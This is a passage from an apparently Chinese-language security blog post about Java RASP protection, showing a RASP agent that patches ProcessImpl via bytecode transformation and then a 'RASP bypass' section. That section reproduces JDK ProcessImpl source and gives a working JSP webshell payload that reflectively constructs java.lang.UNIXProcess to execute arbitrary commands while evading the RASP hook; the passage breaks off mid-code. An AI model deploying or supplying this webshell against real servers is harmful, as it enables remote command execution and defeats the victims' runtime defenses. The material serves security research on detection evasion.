                    <span class="n">CtMethod</span> <span class="n">method</span> <span class="o">=</span> <span class="n">var9</span><span class="o">[</span><span class="n">var11</span><span class="o">];</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">targetMethodName</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">ctMethod</span> <span class="o">=</span> <span class="n">method</span><span class="o">;</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                <span class="o">}</span>

                <span class="k">assert</span> <span class="n">ctMethod</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>

                <span class="n">ctMethod</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">"return null;"</span><span class="o">);</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"Patch %s %s  Success!"</span><span class="o">,</span> <span class="n">targetClassName</span><span class="o">,</span> <span class="n">targetMethodName</span><span class="o">));</span>
                <span class="kt">byte</span><span class="o">[]</span> <span class="n">var18</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
                <span class="k">return</span> <span class="n">var18</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var16</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">var16</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">ctClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
                <span class="o">}</span>

            <span class="o">}</span>

            <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">retransform</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">loadedClasses</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">inst</span><span class="o">.</span><span class="na">getAllLoadedClasses</span><span class="o">();</span>
        <span class="n">Class</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">loadedClasses</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">loadedClasses</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var4</span> <span class="o">&lt;</span> <span class="n">var3</span><span class="o">;</span> <span class="o">++</span><span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">];</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="s">"/"</span><span class="o">,</span> <span class="s">"."</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="n">targetMethodName</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"Find Loaded %s %s Method!"</span><span class="o">,</span> <span class="n">targetClassName</span><span class="o">,</span> <span class="n">targetMethodName</span><span class="o">));</span>

                <span class="k">try</span> <span class="o">{</span>
                    <span class="k">this</span><span class="o">.</span><span class="na">inst</span><span class="o">.</span><span class="na">retransformClasses</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">clazz</span><span class="o">});</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"failed to retransform class "</span> <span class="o">+</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">var7</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>retransform</code>处理：</p>
<ul>
<li>当上面的<code>premain</code>或<code>agentmain</code>检测被触发，会调用<code>retransform</code>进行字节码转换，它通过调用<code>getAllLoadedClasses</code>获取当前所有已加载的所有类。</li>
<li>遍历获取到的所有类，逐个检查类命名否与静态类名<code>ProcessImpl</code>一致，如果一致会调用<code>retransformClasses</code> 进行转换处理</li>
<li>
<code>retransformClasses</code>类实际上最终调用的就是上面的<code>transform</code>方法</li>
</ul>
<p><code>transform</code>处理：</p>
<ul>
<li>方法接收类加载器（loader）、类名（className）、正在被重新定义的类（classBeingRedefined）、保护域（protectionDomain）和类文件字节数组（classfileBuffer）参数。</li>
<li>从<code>classfileBuffer</code>获取创建字节数组中的对象并获取该对象的所有方法。</li>
<li>通过遍历<code>classfileBuffer</code>对象中的所有方法与<code>ProcessImpl</code>匹配，如果匹配到了敏感的类方法，则在方法中插入返回<code>null</code>的代码。</li>
<li>最终将修改完成的对象转换为字节数组并返回，表示完成对类的转换，并释放<code>ctClass</code>对象。</li>
</ul>
<h1 data-content="1" id="fcfa17639d6e13960be69b227636e6ff">RASP绕过</h1>
<p>从上文得知，<code>RASP</code>主要是通过转换字节码来达到目的，如果设置的检测的方法存在着更底层的方法或者相同层级的不同方法能够达到相同的效果，那么就能完成绕过。比如说上文通过检测<code>processImpl.start</code>来进行保护，而在<code>Linux</code>或<code>Mac</code>系统中，还会存在着<code>UNIXProcess.forkAndExec()</code>能够达到<code>RCE</code>的效果。</p>
<h2 data-content="1" id="18c36a63ce1e5dec0bdcd3b15f8641db">UNIXProcess</h2>
<p>至于如何实例化一个<code>UNIXProcess</code>，可以从<code>ProcessImpl</code> 中看出来，以下是这个类的源码:</p>
<div class="highlight"><pre><span></span><span class="kd">final</span> <span class="kd">class</span> <span class="nc">ProcessImpl</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">JavaIOFileDescriptorAccess</span> <span class="n">fdAccess</span>
        <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">SharedSecrets</span><span class="o">.</span><span class="na">getJavaIOFileDescriptorAccess</span><span class="o">();</span>

    <span class="kd">private</span> <span class="nf">ProcessImpl</span><span class="o">()</span> <span class="o">{}</span>    <span class="c1">// Not instantiable</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">toCString</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">s</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">bytes</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">];</span>
        <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span>
                         <span class="n">result</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span>
                         <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="n">result</span><span class="o">[</span><span class="n">result</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span><span class="mi">0</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="n">Process</span> <span class="nf">start</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">cmdarray</span><span class="o">,</span>
                         <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">environment</span><span class="o">,</span>
                         <span class="n">String</span> <span class="n">dir</span><span class="o">,</span>
                         <span class="n">ProcessBuilder</span><span class="o">.</span><span class="na">Redirect</span><span class="o">[]</span> <span class="n">redirects</span><span class="o">,</span>
                         <span class="kt">boolean</span> <span class="n">redirectErrorStream</span><span class="o">)</span>
        <span class="kd">throws</span> <span class="n">IOException</span>
    <span class="o">{</span>
        <span class="k">assert</span> <span class="n">cmdarray</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">cmdarray</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">args</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">cmdarray</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">][];</span>
        <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="c1">// For added NUL bytes</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">cmdarray</span><span class="o">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">].</span><span class="na">getBytes</span><span class="o">();</span>
            <span class="n">size</span> <span class="o">+=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">argBlock</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kt">int</span><span class="o">[]</span> <span class="n">envc</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">envBlock</span> <span class="o">=</span> <span class="n">ProcessEnvironment</span><span class="o">.</span><span class="na">toEnvironmentBlock</span><span class="o">(</span><span class="n">environment</span><span class="o">,</span> <span class="n">envc</span><span class="o">);</span>

        <span class="kt">int</span><span class="o">[]</span> <span class="n">std_fds</span><span class="o">;</span>

        <span class="n">FileInputStream</span>  <span class="n">f0</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">FileOutputStream</span> <span class="n">f1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">FileOutputStream</span> <span class="n">f2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">redirects</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">std_fds</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]</span> <span class="o">{</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span> <span class="o">};</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">std_fds</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">==</span> <span class="n">Redirect</span><span class="o">.</span><span class="na">PIPE</span><span class="o">)</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">==</span> <span class="n">Redirect</span><span class="o">.</span><span class="na">INHERIT</span><span class="o">)</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
                <span class="k">else</span> <span class="o">{</span>
                    <span class="n">f1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="na">file</span><span class="o">(),</span>
                                              <span class="n">redirects</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="na">append</span><span class="o">());</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">fdAccess</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">f1</span><span class="o">.</span><span class="na">getFD</span><span class="o">());</span>
                <span class="o">}</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">==</span> <span class="n">Redirect</span><span class="o">.</span><span class="na">PIPE</span><span class="o">)</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">==</span> <span class="n">Redirect</span><span class="o">.</span><span class="na">INHERIT</span><span class="o">)</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>
                <span class="k">else</span> <span class="o">{</span>
                    <span class="n">f2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">redirects</span><span class="o">[</span><span class="mi">2</span><span class="o">].</span><span class="na">file</span><span class="o">(),</span>
                                              <span class="n">redirects</span><span class="o">[</span><span class="mi">2</span><span class="o">].</span><span class="na">append</span><span class="o">());</span>
                    <span class="n">std_fds</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">fdAccess</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">f2</span><span class="o">.</span><span class="na">getFD</span><span class="o">());</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">UNIXProcess</span>
            <span class="o">(</span><span class="n">toCString</span><span class="o">(</span><span class="n">cmdarray</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span>
             <span class="n">argBlock</span><span class="o">,</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">,</span>
             <span class="n">envBlock</span><span class="o">,</span> <span class="n">envc</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span>
             <span class="n">toCString</span><span class="o">(</span><span class="n">dir</span><span class="o">),</span>
                 <span class="n">std_fds</span><span class="o">,</span>
             <span class="n">redirectErrorStream</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>

            <span class="k">try</span> <span class="o">{</span> <span class="k">if</span> <span class="o">(</span><span class="n">f0</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f0</span><span class="o">.</span><span class="na">close</span><span class="o">();</span> <span class="o">}</span>
            <span class="k">finally</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span> <span class="k">if</span> <span class="o">(</span><span class="n">f1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span> <span class="o">}</span>
                <span class="k">finally</span> <span class="o">{</span> <span class="k">if</span> <span class="o">(</span><span class="n">f2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span> <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<blockquote>
<p><code>UNIXProcess</code>接收 <code>8</code>个参数，其中<code>envc</code>是<code>[1]</code>与<code>std_fds</code>都是恒为-1的数组，<code>redirectErrorStream</code>不影响可为<code>false</code>，<code>args.length</code> 为 <code>cmd.length - 1</code>，至于<code>argBlock</code>的内容，我们赋值代码照着写即可。</p>
</blockquote>
<p>一个jsp的payload：</p>
<div class="highlight"><pre><span></span><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">"text/html;charset=UTF-8"</span> <span class="n">language</span><span class="o">=</span><span class="s">"java"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.*"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Constructor"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Method"</span> <span class="o">%&gt;</span>
<span class="o">&lt;%!</span>
   <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">toCString</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">s</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span>  <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">bytes</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">];</span>
        <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">result</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="n">result</span><span class="o">[</span><span class="n">result</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">InputStream</span> <span class="nf">run</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">strs</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="c1">//创建类</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.UNIXProcess"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.ProcessImpl"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="c1">//获取构造方法</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">()[</span><span class="mi">0</span><span class="o">];</span>
        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="k">assert</span> <span class="n">strs</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">strs</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">;</span>
        <span class="c1">//照着代码赋值即可</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">args</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">strs</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">][];</span>
        <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> 
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">strs</span><span class="o">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">].</span><span class="na">getBytes</span><span class="o">();</span>
            <span class="n">size</span> <span class="o">+=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">argBlock</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
        <span class="kt">int</span>    <span class="n">i</span>        <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">int</span><span class="o">[]</span> <span class="n">envc</span>    <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
        <span class="kt">int</span><span class="o">[]</span> <span class="n">std_fds</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">};</span>
        <span class="n">FileInputStream</span>  <span class="n">f0</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">FileOutputStream</span> <span class="n">f1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">FileOutputStream</span> <span class="n">f2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">f0</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f0</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">f1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">f2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">f2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="c1">//实例化方法</span>
        <span class="n">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span>
                <span class="n">toCString</span><span class="o">(</span><span class="n">strs</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">,</span>
                <span class="kc">null</span><span class="o">,</span> <span class="n">envc</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span> <span class="kc">null</span><span class="o">,</span> <span class="n">std_fds</span><span class="o">,</span> <span class="kc">false</span>
        <span class="o">);</span>
        <span class="n">Method</span> <span class="n">inMethod</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"getInputStream"</span><span class="o">);</span>
        <span class="n">inMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="k">return</span> <span class="o">(</span><span class="n">InputStream</span><span class="o">)</span> <span class="n">inMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
    <span class="o">}</span>
<span class="c1">//将流转化成字符串输出</span>
    <span class="n">String</span> <span class="nf">inputStreamToString</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">ByteArrayOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
            <span class="kt">int</span>                   <span class="n">a</span>   <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="kt">byte</span><span class="o">[]</span>                <span class="n">b</span>   <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
            <span class="k">while</span> <span class="o">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">a</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">out</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">in</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
